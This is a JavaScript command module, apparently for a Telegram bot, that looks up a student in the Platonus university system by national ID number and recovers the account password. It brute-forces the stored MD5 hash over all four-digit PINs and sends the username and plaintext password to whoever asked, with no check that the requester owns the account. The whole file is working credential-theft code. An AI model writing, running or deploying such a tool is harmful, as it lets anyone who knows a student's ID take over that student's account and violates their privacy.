const i18n = require("../locales/localization");
const message = require("../utils/message_parsing");
const t_api = require("../apis/telegram_api");
const plt = require("../apis/platonus");
const crypto = require('crypto');

const initial_message_key = "credentials.initial_message";
const wrong_iin_key = "credentials.wrong_iin";
const user_not_found_key = "credentials.user_not_found";
const critical_key = "credentials.critical";
const ok_key = "credentials.ok";

const md5 = data => crypto.createHash("md5").update(data).digest("hex");

async function send_message(msg, message_key, ...args) {
  const chat_id = message.get_chat_id(msg);
  const locale = message.get_user_locale(msg);
  const str = i18n.t(locale, message_key, ...args);
  await t_api.send_message(chat_id, { text: str });
}

const only_digits = (str) => /^\d+$/.test(str);

const states = {
  initial: {
    handle: async (msg, data) => {
      await send_message(msg, initial_message_key);
      const new_data = { state: "process" };
      return [ new_data, true ];
    },

  },

  process: {
    handle: async (msg, data) => {
      // тут я принимаю иин и пытаюсь понять есть ли такой пользователь в платонусе
      const text = message.get_text(msg);
      if (!text || text.length > 13 || text.length < 11 || !only_digits(text)) {
        await send_message(msg, wrong_iin_key);
        const new_data = { state: "process" };
        return [ new_data, true ];
      }

      const info = await plt.find_student_by_iin(text);
      if (!info) {
        await send_message(msg, user_not_found_key);
        return [];
      }

      for (let x1 = 0; x1 < 10; ++x1) {
        for (let x2 = 0; x2 < 10; ++x2) {
          for (let x3 = 0; x3 < 10; ++x3) {
            for (let x4 = 0; x4 < 10; ++x4) {
              const try_password = `${x1}${x2}${x3}${x4}`;
              const hash = md5(try_password);
              if (hash === info.password) {
                await send_message(msg, ok_key, info.username, try_password);
                return [];
              }
            }
          }
        }
      }

      await send_message(msg, critical_key);
      return [];
    },
    
  }
};

module.exports = {
  aliases: [ "/credentials" ],
  handle: async (msg, data) => {
    if (!data) data = { state: "initial" };

    const state = states[data.state];
    const [ new_data, is_current ] = await state.handle(msg, data);
    if (new_data && !states[new_data.state]) throw `Bad state ${new_data.state}`;
    if (new_data && states[new_data.state].start) {
      await states[new_data.state].start(msg, data);
    }

    return [ new_data, is_current ];
  },
};